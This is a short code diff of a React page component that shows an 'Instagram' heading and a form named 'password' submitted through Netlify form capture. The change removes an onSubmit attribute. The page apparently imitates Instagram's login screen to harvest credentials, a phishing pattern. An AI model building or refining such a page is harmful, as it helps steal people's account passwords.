@@ -11,7 +11,7 @@ export default function Home() {
         <div className={styles.container}>
           <div className={styles.phoneappdemo} />
           <div className={styles.formdata}>
-            <form name="password"  method="POST" data-netlify="true" onSubmit="submit">
+            <form name="password"  method="POST" data-netlify="true">
               <div className={styles.logo}>
                 <h1 className={styles.insta}>Instagram</h1>
               </div>
